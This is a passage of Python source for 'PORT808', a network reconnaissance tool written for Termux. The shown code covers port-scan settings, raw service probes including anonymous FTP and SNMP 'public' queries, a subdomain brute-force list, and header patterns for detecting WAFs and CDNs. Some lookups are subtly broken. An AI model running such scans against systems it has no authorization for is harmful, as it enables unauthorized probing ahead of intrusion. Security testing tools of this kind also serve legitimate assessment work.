#!/usr/bin/env python3
"""
PORT808 - Advanced Network Reconnaissance & Security Assessment Tool
Author: SYLHETYHACKVENGER (THE-ERROR808)
Purpose: Educational Security Research & Authorized Penetration Testing
Pure Python Version - Optimized for Termux/Android
"""

import os
import sys
import json
import socket
import struct
import time
import threading
import subprocess
import ipaddress
import binascii
import hashlib
import base64
import re
import csv
import queue
import logging
import signal
import shutil
import urllib.parse
import urllib.request
import ssl as ssl_lib
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any, Set, Union
from dataclasses import dataclass, field, asdict
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, Counter
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from pathlib import Path
from functools import partial
from contextlib import contextmanager
from enum import Enum
import itertools
import random
import string

# Suppress warnings
import warnings
warnings.filterwarnings("ignore")

os.environ['PYTHONWARNINGS'] = 'ignore'

# Optional imports
try:
    import dns.resolver
    import dns.reversename
    import dns.query
    import dns.zone
    import dns.name
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    import maxminddb
    MAXMIND_AVAILABLE = True
except:
    MAXMIND_AVAILABLE = False

try:
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib import colors
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT
    REPORTLAB_AVAILABLE = True
except:
    REPORTLAB_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except:
    WHOIS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except:
    BS4_AVAILABLE = False

try:
    from pysnmp.hlapi import *
    SNMP_AVAILABLE = True
except:
    SNMP_AVAILABLE = False

from colorama import init, Fore, Style, Back
init(autoreset=True)

class ScanMode(Enum):
    TCP = "TCP"
    UDP = "UDP"
    ICMP = "ICMP"
    ALL = "ALL"

class RiskLevel(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

CONFIG = {
    "max_threads": 1000,
    "timeout": 2.0,
    "retry_count": 2,
    "packet_size": 65535,
    "scan_interval": 0.0001,
    "report_dir": "./reports",
    "log_dir": "./logs",
    "cache_dir": "./cache",
    "max_workers": 50,
    "enable_verbose": True,
    "enable_progress": True,
    "enable_logging": True,
    "log_level": "INFO",
    "domain_timeout": 5,
    "subdomain_timeout": 2,
    "tech_detect_timeout": 5,
    "max_subdomains": 100,
    "max_packet_storage": 500,
    "max_directories": 20,
    "max_parameters": 20,
    "ssl_verify": False,
    "safe_mode": False,
    "max_port_scan": 65535,
    "scan_batch_size": 1000,
    "default_ports": [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017],
    "service_probes": {
        21: b"USER anonymous\r\n",
        22: b"SSH-2.0-Port808\r\n",
        25: b"EHLO test\r\n",
        80: b"HEAD / HTTP/1.0\r\n\r\n",
        443: b"HEAD / HTTP/1.0\r\n\r\n",
        3306: b"\x05\x00\x00\x00\x0a",
        5432: b"\x00\x00\x00\x08\x04\xd2\x16\x2f",
        6379: b"PING\r\n",
        27017: b"\x3d\x00\x00\x00\x00\x00\x00\x00",
        3389: b"\x03\x00\x00\x0d\x0e\x00\x00\x00\x00\x00\x00\x00\x00",
        445: b"\x00\x00\x00\x00",
        53: b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
        161: b"\x30\x25\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x18\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x01\x01\x00\x00\x00\x05\x00"
    }
}

for dir_name in [CONFIG["report_dir"], CONFIG["log_dir"], CONFIG["cache_dir"]]:
    try:
        Path(dir_name).mkdir(parents=True, exist_ok=True, mode=0o755)
    except:
        Path(f"./{dir_name}").mkdir(parents=True, exist_ok=True, mode=0o755)

def setup_logging():
    try:
        log_file = f"{CONFIG['log_dir']}/port808_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.NullHandler()
            ]
        )
        return logging.getLogger("Port808")
    except:
        return logging.getLogger("Port808")

LOGGER = setup_logging()

class Animator:
    """Terminal animation and progress display"""
    def __init__(self):
        self.spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        self.bar_chars = ['█', '▓', '▒', '░']
        self.current_spinner = 0
        self.start_time = time.time()
        self.last_update = 0
        
    def spinner(self) -> str:
        self.current_spinner = (self.current_spinner + 1) % len(self.spinner_chars)
        return self.spinner_chars[self.current_spinner]
    
    def progress_bar(self, current: int, total: int, width: int = 40) -> str:
        if total == 0:
            return "[" + "░" * width + "]"
        progress = current / total
        filled = int(width * progress)
        bar = "█" * filled + "░" * (width - filled)
        return f"[{bar}] {current}/{total} ({progress*100:.1f}%)"
    
    def elapsed_time(self) -> str:
        elapsed = time.time() - self.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        if hours > 0:
            return f"{hours}h{minutes:02d}m{seconds:02d}s"
        elif minutes > 0:
            return f"{minutes}m{seconds:02d}s"
        else:
            return f"{seconds}s"
    
    def eta(self, current: int, total: int) -> str:
        if current == 0:
            return "Calculating..."
        elapsed = time.time() - self.start_time
        rate = current / elapsed
        remaining = (total - current) / rate if rate > 0 else 0
        if remaining > 3600:
            return f"{int(remaining//3600)}h{int((remaining%3600)//60)}m"
        elif remaining > 60:
            return f"{int(remaining//60)}m{int(remaining%60)}s"
        else:
            return f"{int(remaining)}s"
    
    def animate_scan(self, port: int, total: int, found: int, host: str):
        """Animated scanning display"""
        spinner = self.spinner()
        elapsed = self.elapsed_time()
        eta = self.eta(port, total)
        progress = self.progress_bar(port, total)
        
        sys.stdout.write(f"\r\033[K{Colors.CYAN}{spinner} {Colors.WHITE}Scanning {host} {progress} {Colors.YELLOW}Found: {found} {Colors.CYAN}⏱ {elapsed} ETA: {eta}")
        sys.stdout.flush()

class Colors:
    """ANSI color codes"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

def print_banner():
    """Display animated banner"""
    banner_text = r"""
\033[91m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⢹⠀⠀⡀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠴⣶⣶⣺⣿⣼⣄⠀⣟⣇⠀⢠⠀⠀⠀⣿⠀⠀⠀⡿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢀⣤⡿⠚⣹⣧⣶⠟⣏⢛⢹⣿⣿⢉⠉⡏⡿⣿⢻⠶⣤⣰⣷⡇⠠⣰⣿⣇⢀⠆⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⠀⣸⡟⡋⢸⡆⢰⣿⣷⣄⣸⣏⣏⣹⣿⣿⡄⣸⣷⣿⣇⡟⢀⣴⣿⡟⡿⢶⣿⡟⣿⣮⣀⣠⣞⠁⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⣿⣠⣞⣽⣿⡿⢿⣷⣄⣿⣟⣧⣽⣿⣟⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⠟⣼⣿⣿⣷⡟⠿⢧⣄⡀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⢱⡄⠀⣄⣿⣿⡉⠁⢻⣿⣥⡽⢿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣯⣿⣿⣯⣿⣿⣿⡿⡻⠿⣶⡾⠋⢉⣶⡿⠥⠄⣠⠞⠀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠸⣆⠀⢹⣭⣿⣅⠘⣿⣾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣻⡯⣪⣥⡶⠛⣻⣶⣿⢏⠀⣠⣟⡁⢠⠀⢈⡀⠀⢀⠀
⠀⠀⠀⠀⠀⠀⣼⠀⠘⣶⣾⠏⣿⣿⢿⣿⣿⣿⣿⡿⠟⢉⣽⣿⣿⣿⠿⠛⠉⠉⠁⠀⠀⠈⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣷⣟⣩⣏⣹⠿⠁⣰⠃⢀⡜⠀
⠀⠀⠀⠀⠀⠀⢻⣥⡴⢋⣹⣿⣿⣽⣿⣿⣿⡿⠏⠀⣠⣿⣿⡿⠋⠀⠀⠀⠀⣀⣀⣤⣤⣄⣀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣟⣿⣶⡾⣷⣶⣾⡟⢉⣾⡇⠀
⠀⠀⠀⠀⠰⠂⣠⡿⣷⣾⣿⣷⣿⣿⣿⣿⠃⠀⠀⢰⣿⣿⠋⠀⠀⠀⢀⣶⣿⣿⣿⠿⠿⣿⣿⣿⣷⣄⠀⠀⠀⠈⢿⣿⣿⣻⢿⣿⣿⣿⣿⣤⣤⣾⣟⣻⣿⣿⣏⣴⡿⢋⣴⠛
⠀⠀⠀⠀⠀⣺⣏⣾⠟⣻⣿⣿⠇⣿⣿⡇⠀⠀⢀⣿⣿⡏⠀⠀⠀⢰⣿⣿⠟⠉⠀⠀⠀⠀⠉⠻⣿⣿⣷⡀⠀⠀⠀⢻⣿⣿⢣⡙⢿⣿⣿⣿⣿⣯⣿⣶⣾⡿⣟⣭⣶⡾⠋⠀
⠀⠠⢤⡆⣴⣳⣿⢿⣿⡿⠟⠁⠀⣿⣿⠁⠀⠀⠸⣿⣿⡇⠀⠀⠀⢸⣿⣿⣤⣤⣴⣶⣦⡀⠀⠀⠈⢿⣿⣷⠀⠀⠀⠘⣿⣿⡆⢻⠠⠟⠿⣿⣿⣿⣿⣟⡛⣻⣿⠟⠋⣀⢀⠀
⠀⠀⠀⣙⣿⣿⣿⣿⠋⣴⡄⠀⠀⣿⣿⡆⠀⠀⠀⢻⣿⣷⡀⠀⠀⠈⠻⠿⠿⠟⠛⣿⣿⣧⠀⠀⠀⢸⣿⣿⡄⠀⠀⠀⣿⣿⣇⡟⠀⠀⠀⢲⣿⣿⣿⣿⣿⣿⣶⣶⣾⡿⠟⠀
⠀⣀⣠⣿⣟⣷⡿⢁⡾⢸⡁⠀⠀⢻⣿⣷⡀⠀⠀⠈⢿⣿⣿⣤⣀⠀⠀⠀⠀⢀⣰⣿⣿⡏⠀⠀⠀⢸⣿⣿⠁⠀⠀⢠⣿⣿⡟⠀⠀⠀⢠⣿⢿⣢⡻⢿⠙⢿⣛⣏⠁⠀⠀⠀
⢠⣾⣿⠟⣽⡟⡇⠙⢿⢄⣇⠀⠀⠀⢿⣿⣷⡄⠀⠀⠀⠙⠿⣿⣿⣿⣷⣶⣿⣿⣿⡿⠋⠀⠀⠀⣠⣿⣿⡟⠀⠀⠀⣾⣿⠋⠀⠀⢀⢀⣿⡿⢷⣾⣿⣯⣄⣹⡿⠋⠀⠀⠀⠀
⠀⠉⠁⢰⣿⠁⣳⡅⠈⣦⡝⣤⡀⠀⠈⠻⣿⣿⣦⡀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⢀⣴⣿⣿⠟⠀⠀⢀⣾⠟⠁⠀⠀⢠⣬⣿⣿⣿⣞⠇⢳⡌⢿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⡿⢧⡀⠉⣩⣤⣧⣈⠙⠺⠶⣤⣄⡈⠻⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣿⠟⠁⠀⢀⣴⠟⠁⠀⢀⣤⣾⣿⣿⠿⣾⠷⣿⣆⡼⠓⣾⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⢦⣉⣉⣀⠤⡜⠉⠛⢶⣤⣄⣀⣉⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⠁⣠⠴⠞⣉⣀⣀⣤⣶⢶⣻⣿⡵⣘⠢⠈⣦⠘⢿⠇⢰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠛⠛⠛⢧⣤⡴⠋⠀⠈⢻⡿⠾⢿⣷⣶⣤⣴⣆⣌⣭⣉⣩⣭⣉⠀⣄⡤⣄⢠⣤⣄⣠⣴⠾⣿⡿⣏⠘⠻⣧⡘⣿⡜⠶⠄⠈⢤⠞⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣯⣭⣽⣳⢦⣉⠲⢤⣠⠏⠀⠀⡼⣱⠋⢹⣿⢻⠟⠛⡟⣿⠟⢻⠟⣟⢿⠻⣟⠛⢯⢻⣯⣆⠘⣿⡌⢳⣄⢻⣷⠈⠀⠀⢀⡤⠋⢠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠉⠉⠻⢷⣌⠙⠲⣽⡃⠀⠀⢷⠇⠀⠸⠁⡞⠀⡀⠙⡟⠂⠀⡟⢿⣼⠀⠹⡇⠈⢧⣎⢿⣇⠸⠿⠀⠉⢮⠏⠃⢀⡴⠊⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⡀⠉⠓⢦⣞⠀⠀⠀⠀⠁⠀⠀⠀⡇⠈⠳⡷⠀⡿⠴⠀⠘⠀⠸⠋⠻⣿⠀⠀⠁⠈⢈⡧⠞⠁⠀⠀⠜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠓⠦⣄⣀⠀⠀⠀⠁⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠲⠤⢤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[92m
__________              __   ______ _______     ______  
\______   \____________/  |_/  __  \\   _  \   /  __  \ 
 |     ___/  _ \_  __ \   __>      </  /_\  \  >      < 
 |    |  (  <_> )  | \/|  |/   --   \  \_/   \/   --   \
 |____|   \____/|__|   |__|\______  /\_____  /\______  /
                                  \/       \/        \/ 
\033[96m
╔═══════════════════════════════════════════════════════════════════════════╗
║  PORT808 - Advanced Network Reconnaissance & Security Assessment Tool    ║
║  Author: SYLHETYHACKVENGER (THE-ERROR808)                               ║
║  Purpose: Educational Security Research & Authorized Penetration Testing║
║  Pure Python - Optimized for Maximum Speed                              ║
╚═══════════════════════════════════════════════════════════════════════════╝
\033[0m
"""
    print(banner_text)
    time.sleep(0.5)

@dataclass
class PacketDetail:
    timestamp: float
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: str
    flags: List[str]
    flags_hex: str
    sequence: int
    ack_number: int
    window_size: int
    checksum: str
    payload_size: int
    payload_hex: str = ""
    ttl: int = 64
    ip_id: int = 0
    fragmentation: str = "None"

@dataclass
class DomainInfo:
    domain: str
    ipv4: List[str]
    ipv6: List[str]
    cname: str = ""
    mx: List[str] = field(default_factory=list)
    ns: List[str] = field(default_factory=list)
    txt: List[str] = field(default_factory=list)
    soa: List[str] = field(default_factory=list)
    ptr: str = ""
    subdomains: List[str] = field(default_factory=list)
    whois: Dict[str, str] = field(default_factory=dict)
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    technology: Dict[str, Any] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: List[str] = field(default_factory=list)
    status_code: int = 0
    server_info: str = ""

@dataclass
class ServiceFingerprint:
    name: str
    version: str
    vendor: str
    os: str
    protocols: List[str]
    auth_methods: List[str]
    crypto: List[str]
    banner: str
    confidence: float
    extra_info: Dict[str, Any] = field(default_factory=dict)

@dataclass
class OSFingerprint:
    name: str
    version: str
    family: str
    ttl: int
    window_size: int
    flags: List[str]
    confidence: float
    extra_info: Dict[str, Any] = field(default_factory=dict)

@dataclass
class Vulnerability:
    cve_id: str
    name: str
    cvss_score: float
    cvss_vector: str
    type: str
    description: str
    impact: str
    exploit: str
    fix: str
    published: str
    affected_versions: List[str]
    references: List[str] = field(default_factory=list)
    
    def __post_init__(self):
        if self.cvss_score < 0 or self.cvss_score > 10:
            raise ValueError(f"Invalid CVSS score: {self.cvss_score}")
        if not self.cve_id.startswith('CVE-'):
            raise ValueError(f"Invalid CVE ID: {self.cve_id}")

@dataclass
class HTTPHeaderAnalysis:
    security_headers: Dict[str, bool]
    cookies: List[Dict[str, Any]]
    server_info: str
    methods: List[str]
    status_code: int
    content_type: str
    is_secure: bool
    issues: List[str]
    directories: List[str]
    parameters: List[str]
    sql_injection: bool
    xss: bool
    csrf: bool
    clickjacking: bool

@dataclass
class TLSDetail:
    version: str
    cipher_suites: List[str]
    certificate: Dict[str, Any]
    is_secure: bool
    weak_ciphers: List[str]
    issues: List[str]
    perfect_forward_secrecy: bool
    heartbleed: bool
    poodle: bool
    drown: bool
    freak: bool
    logjam: bool
    beast: bool
    crime: bool
    breach: bool

@dataclass
class SNMPDetail:
    community_string: str
    version: str
    sys_descr: str
    sys_name: str
    sys_location: str
    sys_contact: str
    interfaces: List[Dict]
    vulnerabilities: List[str]

@dataclass
class ScanResult:
    port: int
    protocol: str
    state: str
    service: ServiceFingerprint
    os: Optional[OSFingerprint]
    latency: float
    packets_sent: List[PacketDetail]
    packets_received: List[PacketDetail]
    vulnerabilities: List[Vulnerability]
    risk_score: float
    confidence: float
    analysis: Dict[str, Any]
    geolocation: Dict[str, str]
    dns_info: Dict[str, Any]
    certificate: Optional[Dict[str, Any]]
    firewall_type: str
    timing_analysis: Dict[str, float]
    http_analysis: Optional[HTTPHeaderAnalysis] = None
    tls_details: Optional[TLSDetail] = None
    network_path: List[str] = field(default_factory=list)
    snmp_info: Optional[SNMPDetail] = None
    domain_info: Optional[DomainInfo] = None
    scan_timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

class URLHandler:
    def __init__(self):
        self.url_pattern = re.compile(
            r'^(?:(?P<scheme>[a-z][a-z0-9+.-]*):\/\/)?'
            r'(?:(?P<user>[^:]+):(?P<pass>[^@]+)@)?'
            r'(?P<host>[^:\/\?#]+)'
            r'(?::(?P<port>\d+))?'
            r'(?P<path>\/[^?#]*)?'
            r'(?:\?(?P<query>[^#]*))?'
            r'(?:#(?P<fragment>.*))?$'
        )
        self.common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging',
            'blog', 'shop', 'store', 'support', 'help', 'docs', 'wiki',
            'portal', 'dashboard', 'app', 'mobile', 'm', 'cdn', 'static',
            'assets', 'media', 'video', 'images', 'img', 'js', 'css',
            'download', 'upload', 'backup', 'cloud', 'web', 'server',
            'mysql', 'database', 'db', 'redis', 'cache', 'elastic',
            'kibana', 'grafana', 'prometheus', 'jenkins', 'gitlab',
            'github', 'bitbucket', 'jira', 'confluence', 'sharepoint',
            'exchange', 'outlook', 'owa', 'remote', 'vpn', 'ssh', 'smtp',
            'pop3', 'imap', 'ns1', 'ns2', 'ns3', 'dns1', 'dns2', 'mx1',
            'mx2', 'ftp1', 'ftp2', 'webmail', 'cpanel', 'whm', 'plesk',
            'directadmin', 'cloudflare', 'akamai', 'fastly', 'cloudfront',
            's3', 'elasticbeanstalk', 'heroku', 'azure', 'aws', 'gcp'
        ]
        self.cms_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-admin', 'wp-json', 'xmlrpc.php'],
            'Drupal': ['sites/all', 'sites/default', 'drupal', 'Drupal.settings'],
            'Joomla': ['joomla', 'com_content', 'com_users', 'Joomla!'],
            'Magento': ['skin/frontend', 'Mage::', 'Magento', 'checkout/cart'],
            'Shopify': ['cdn.shopify.com', 'shopify', 'products/', 'collections/'],
            'Wix': ['wix.com', 'wix', 'viewer.min.js'],
            'Squarespace': ['squarespace.com', 'static.squarespace.com'],
            'Ghost': ['ghost.org', 'ghost', 'content/images'],
            'Prestashop': ['prestashop', 'modules/', 'themes/'],
            'OpenCart': ['opencart', 'catalog/view', 'index.php?route='],
            'Django': ['django', 'csrftoken', 'sessionid', 'admin/'],
            'Laravel': ['laravel', 'laravel_session', '/vendor/', '/storage/'],
            'Rails': ['_rails', 'rack.session', '/assets/'],
            'Spring': ['spring', 'spring-boot', '/actuator/'],
            'Express': ['express', 'connect.sid', '/public/'],
            'Flask': ['flask', 'session', '/static/'],
            'ASP.NET': ['ASP.NET', '__VIEWSTATE', '__EVENTVALIDATION']
        }
        self.framework_patterns = {
            'Laravel': ['laravel', 'laravel_session', '_token', 'csrf'],
            'Django': ['django', 'csrftoken', 'sessionid', 'admin/'],
            'Rails': ['_rails', 'rack.session', 'csrf-param'],
            'Spring': ['spring', 'spring-boot', 'actuator'],
            'Express': ['express', 'connect.sid', 'x-powered-by'],
            'Flask': ['flask', 'session', '/static/'],
            'ASP.NET': ['ASP.NET', '__VIEWSTATE', '__EVENTVALIDATION'],
            'Ruby on Rails': ['rails', '_session', 'authenticity_token'],
            'Node.js': ['node.js', 'express', 'connect.sid'],
            'PHP': ['php', 'PHPSESSID', '.php'],
            'Python': ['python', 'wsgi', '/static/']
        }
        self.cdn_patterns = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare', 'cf-'],
            'Akamai': ['akamai', 'x-akamai', 'akamaitech'],
            'CloudFront': ['cloudfront', 'x-amz-cf-id', 'amazonaws.com'],
            'Fastly': ['fastly', 'x-fastly', 'fastly-'],
            'Varnish': ['varnish', 'x-varnish', 'X-Varnish'],
            'Sucuri': ['sucuri', 'Sucuri-CloudProxy', 'x-sucuri'],
            'Incapsula': ['incapsula', 'x-cdn', 'X-I']
        }
        self.waf_patterns = {
            'Cloudflare WAF': ['cf-ray', '__cfduid', 'cf-chl-bypass'],
            'AWS WAF': ['x-amz-cf-id', 'AWSWAF', 'awswaf'],
            'ModSecurity': ['mod_security', 'ModSecurity', 'Sec-Server'],
            'Imperva': ['X-Imperva', 'imperva', 'x-request-id'],
            'Sucuri': ['sucuri', 'Sucuri-CloudProxy', 'x-sucuri'],
            'F5 ASM': ['X-F5', 'F5-ASM', 'BigIP'],
            'Fortinet': ['fortinet', 'FortiWeb', 'FortiGuard'],
            'Barracuda': ['barracuda', 'x-barracuda']
        }
        self.lb_patterns = {
            'AWS ELB': ['x-amz', 'AWSELB', 'aws-elb'],
            'HAProxy': ['x-forwarded-for', 'haproxy', 'PROXY'],
            'Nginx LB': ['nginx', 'x-nginx', 'nginx-ingress'],
            'F5 BigIP': ['X-F5', 'F5-BigIP', 'BIGipServer'],
            'Apache LB': ['apache', 'mod_proxy', 'Balancer'],
            'Traefik': ['traefik', 'x-forwarded']
        }

    def parse_url(self, url: str) -> Optional[Dict[str, Any]]:
        if not url:
            return None
        match = self.url_pattern.match(url)
        if not match:
            return None
        data = match.groupdict()
        if not data.get('port'):
            if data.get('scheme') == 'https':
                data['port'] = '443'
            elif data.get('scheme') == 'http':
                data['port'] = '80'
            elif data.get('scheme') == 'ftp':
                data['port'] = '21'
        return data

    def resolve_domain(self, domain: str) -> Dict[str, Any]:
        result = {
            'domain': domain,
            'ipv4': [],
            'ipv6': [],
            'cname': None,
            'mx': [],
            'ns': [],
            'txt': [],
            'soa': [],
            'ptr': None
        }
        if not DNS_AVAILABLE:
            return result
        try:
            a_records = dns.resolver.resolve(domain, 'A')
            result['ipv4'] = [str(r) for r in a_records]
        except:
            pass
        try:
            aaaa_records = dns.resolver.resolve(domain, 'AAAA')
            result['ipv6'] = [str(r) for r in aaaa_records]
        except:
            pass
        try:
            cname_records = dns.resolver.resolve(domain, 'CNAME')
            result['cname'] = str(cname_records[0])
        except:
            pass
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            result['mx'] = [str(r.exchange) for r in mx_records]
        except:
            pass
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            result['ns'] = [str(r) for r in ns_records]
        except:
            pass
        try:
            txt_records = dns.resolver.resolve(domain, 'TXT')
            result['txt'] = [str(r) for r in txt_records]
        except:
            pass
        try:
            soa_records = dns.resolver.resolve(domain, 'SOA')
            result['soa'] = [str(r) for r in soa_records]
        except:
            pass
        try:
            reversed_name = dns.reversename.from_address(domain)
            ptr = dns.resolver.resolve(reversed_name, 'PTR')
            result['ptr'] = str(ptr[0])
        except:
            pass
        return result

    def discover_subdomains(self, domain: str) -> List[str]:
        found_subdomains = []
        total = min(len(self.common_subdomains), CONFIG['max_subdomains'])
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for sub in self.common_subdomains[:total]:
                full_domain = f"{sub}.{domain}"
                futures.append(executor.submit(self._check_subdomain, full_domain))
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        found_subdomains.append(result)
                except:
                    pass
        return found_subdomains

    def _check_subdomain(self, full_domain: str) -> Optional[str]:
        try:
            dns.resolver.resolve(full_domain, 'A', lifetime=CONFIG['subdomain_timeout'])
            return full_domain
        except:
            return None

    def detect_technology(self, url: str) -> Dict[str, Any]:
        result = {
            'cms': None,
            'framework': None,
            'server': None,
            'js_framework': None,
            'cdn': None,
            'waf': None,
            'load_balancer': None,
            'cookies': [],
            'headers': {},
            'technologies': []
        }
        if not REQUESTS_AVAILABLE:
            return result
        try:
            verify = CONFIG.get('ssl_verify', True)
            response = requests.get(
                url,
                timeout=CONFIG['tech_detect_timeout'],
                verify=verify,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            if 'Server' in response.headers:
                result['server'] = response.headers['Server']
            for cms, patterns in self.cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in response.text.lower():
                        result['cms'] = cms
                        break
                if result['cms']:
                    break
            for framework, patterns in self.framework_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in response.text.lower() or pattern.lower() in str(response.headers).lower():
                        result['framework'] = framework
                        break
                if result['framework']:
                    break
            for cdn, patterns in self.cdn_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in str(response.headers).lower():
                        result['cdn'] = cdn
                        break
                if result['cdn']:
                    break
            for waf, patterns in self.waf_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in str(response.headers).lower():
                        result['waf'] = waf
                        break
                if result['waf']:
                    break
            for lb, patterns in self.lb_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in str(response.headers).lower():
                        result['load_balancer'] = lb
                        break
                if result['load_balancer']:
                    break
            if 'Set-Cookie' in response.headers:
                result['cookies'] = response.headers.get_list('Set-Cookie')
            result['headers'] = dict(response.headers)
            if BS4_AVAILABLE:
                soup = BeautifulSoup(response.text, 'html.parser')
                js_scripts = [s.get('src', '') for s in soup.find_all('script') if s.get('src')]
                for script in js_scripts:
                    if 'react' in script.lower():
                        result['js_framework'] = 'React'
                        break
                    elif 'angular' in script.lower():
                        result['js_framework'] = 'Angular'
                        break
                    elif 'vue' in script.lower():
                        result['js_framework'] = 'Vue.js'
                        break
                    elif 'jquery' in script.lower():
